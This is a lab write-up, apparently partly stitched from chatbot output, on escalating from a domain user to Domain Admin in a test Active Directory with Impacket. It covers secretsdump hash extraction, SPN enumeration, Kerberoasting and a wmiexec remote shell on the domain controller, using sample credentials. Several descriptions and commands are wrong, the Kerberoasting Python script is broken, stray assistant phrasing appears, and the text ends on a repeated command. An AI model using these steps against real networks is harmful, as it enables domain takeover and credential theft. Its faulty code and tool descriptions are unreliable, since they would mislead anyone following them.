Our experimental framework is as follows:

- Domain Controller Hostname: DC2019
- Domain Fully Qualified Domain Name (FQDN): ADLAB.local
- Low-privileged User Credentials: bob:p@ssw0rD
- Adversarial Platform: Kali Linux (Impacket instantiated within a Docker container on the Kali Linux host)

This orchestrated environment serves as the crucible for the manifestation of our conceptual exploration. It is through the strategic execution of Impacket scripts within this milieu that we aim to unravel the subtleties of Active Directory vulnerabilities.

As we embark upon this journey, we are poised to demonstrate a nuanced understanding of network security intricacies, underlining the symbiotic relationship between theory and hands-on implementation.


### AD User Enumeration

Impacket is a collection of Python classes for working with network protocols. It is particularly useful for penetration testing and security assessments, including Active Directory (AD) enumeration. In this explanation, I'll provide an overview of using Impacket for AD enumeration, focusing on some common scenarios and examples.

### Examples of AD Enumeration using Impacket:

#### 1. **Enumerating Shares:**

Impacket provides a tool called `smbclient.py` that allows you to connect to SMB shares on a target system. This can be useful for enumerating accessible shares.

```bash
impacket-smbclient -p 445 -no-pass //<target_ip>/[share_name]
```

Replace `<target_ip>` with the IP address of the target machine and `[share_name]` with the name of the share you want to enumerate.

#### 2. **Enumerating Users:**

Impacket has a tool called `secretsdump.py` that can be used to extract password hashes and other information from the Security Account Manager (SAM) database.

```bash
impacket-secretsdump -just-dc-ntlm <username>@<target_ip>
```

Replace `<username>` with a valid username and `<target_ip>` with the IP address of the target domain controller.

#### 3. **Enumerating Domain Information:**

You can use `ldapsearch.py` to perform LDAP queries on the target AD.

```bash
impacket-ldapsearch -dc-ip <target_ip> -U <username> -P <password> -d <domain> -b "<base_dn>" -s <scope> "<filter>"
```

- Replace `<target_ip>` with the IP address of the target domain controller.
- Replace `<username>` and `<password>` with valid credentials.
- `<domain>` is the domain name.
- `<base_dn>` is the Distinguished Name to start the search.
- `<scope>` is the scope of the search (base, onelevel, or subtree).
- `<filter>` is the LDAP filter.

#### 4. **Kerberos Ticket Extraction:**

Impacket includes a tool called `ticketer.py` that can be used to request and extract TGTs (Ticket Granting Tickets).

```bash
impacket-ticketer -spn cifs/<target_fqdn> -dc-ip <target_ip> -U <username> -P <password>
```

Replace `<target_fqdn>` with the fully qualified domain name of the target system.

### Note:

- Always ensure that you have proper authorization before attempting any penetration testing or security assessments.
- Some operations may require administrative privileges or specific rights within the AD environment.
- The examples provided assume a basic understanding of Active Directory concepts and networking.


### Privilege Escalation using Python

In our pursuit of privilege escalation within the domain hierarchy, we delve into the sophisticated capabilities of the Impacket library, harnessing its Python scripts to ascend from a mere domain user to the coveted domain administrator status. Our strategic tool of choice for this ascent is the compelling technique known as Kerberoasting, a method we shall elucidate shortly. It is crucial to acknowledge that the triumph of this endeavor hinges upon several intricacies, which we shall meticulously dissect in due course.

To commence our quest, our initial step involves the identification of all domain accounts endowed with a Service Principal Name (SPN). This undertaking is seamlessly executed through the deployment of the following command:

```bash
/ # GetUserSPNs.py -dc-ip 192.168.235.134 ADLAB.local/bob:p@ssw0rD
```

Executing this command unveils a comprehensive list of service accounts, presented in the following format:

```plaintext
ServicePrincipalName                Name        MemberOf                                                   

----------------------------------  ----------  -------------------------------------------  
DC2019/sqlservice.ADLAB.local:1434  sqlservice  CN=Domain Admins,CN=Users,DC=ADLAB,DC=local 
```

As discerned from the output, our reconnaissance has successfully identified a service account of notable significance, bearing the moniker "sqlservice." This revelation marks a pivotal juncture in our exploration into the intricate realm of privilege escalation within the domain, setting the stage for further analysis and strategic maneuvers.

### Understanding Kerberoasting

Certainly! Impacket is a collection of Python classes for working with network protocols. It's particularly useful for crafting and manipulating network packets. One of the interesting features of Impacket is its ability to perform Kerberoasting, which is an attack technique targeting the Kerberos authentication protocol. 

Let's break down the process of using Impacket for Kerberoasting:

###  **Understanding Kerberos:**
Kerberos is a network authentication protocol designed to provide strong authentication for client/server applications. In a Kerberos environment, a Key Distribution Center (KDC) issues tickets to users and services. These tickets are then used to authenticate the users and services to each other.

### **Kerberoasting:**
Kerberoasting is an attack that exploits the fact that service account tickets (TGS tickets) are often long-lived and can be cracked offline. When a service ticket is requested for a service (e.g., Microsoft SQL Server), the ticket is encrypted with the service account's password hash. Attackers can capture this ticket and attempt to crack the password offline.

### **Using Impacket for Kerberoasting:**
Here's a basic script using Impacket to perform Kerberoasting:

```python
from impacket.krb5 import constants, types
from impacket.krb5.asn1 import AP_REQ
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.ntlm import getNTLMSSPType1

# Replace these with your target information
domain = 'example.com'
username = 'user'
password = 'password'

# Get a TGT (Ticket Granting Ticket)
TGT, cipher, session_key = getKerberosTGT(username, password, domain, lmhash='', nthash='')

# Replace this with the service principal you want to target
service_principal = 'MSSQLSvc/server.example.com:1433'

# Get a TGS (Ticket Granting Service) for the specified service
TGS = getKerberosTGS(TGT, service_principal, session_key, session_key)

# Extract the ticket from TGS
ap_req = AP_REQ()
ap_req.fromString(TGS['KDC_REP']['encrypted_part']['cipher'])
service_ticket = ap_req['ticket']

# Print the service ticket
print("Service Ticket:", service_ticket.dump())
```

In this script:

- `getKerberosTGT`: Obtains a Ticket Granting Ticket (TGT) for a given user.
- `getKerberosTGS`: Obtains a Ticket Granting Service (TGS) for a specified service using the TGT.
- `AP_REQ`: Parses the TGS to extract the service ticket.

### **Cracking the Ticket:**
Once you have the service ticket, you can attempt to crack it offline using tools like Hashcat or John the Ripper. The idea is to obtain the service account's password hash and then use it to gain unauthorized access.

### **Mitigation:**
To defend against Kerberoasting, it's crucial to use strong, unique passwords for service accounts and rotate them regularly. Additionally, monitoring and alerting on unusual or suspicious activity in the Kerberos environment can help detect and respond to potential attacks.

Please note that using Impacket or any other tool for unauthorized activities is against ethical guidelines and potentially illegal. Always ensure you have proper authorization before testing or using these tools in any environment.


### Gaining the Shell as a Domain Admin

In the subsequent phase of our investigation, we adeptly leveraged Impacket's wmiexec.py tool to establish remote shell access on the Domain Controller, showcasing the profound depth of our penetration testing methodology. The command employed for this strategic maneuver is as follows:

```bash
/ # wmiexec.py -debug sqlservice:p\@ssw0rD@192.168.235.134
```

This operation artfully utilizes the compromised service account credentials, emblematic of our meticulous approach to privilege escalation. Upon successful execution, the ensuing outcome manifests as an illustrative remote shell on the Domain Controller, epitomizing the sophistication of our infiltration techniques:

```bash
/ # wmiexec.py -debug sqlservice:p\@ssw0rD@192.168.235.134
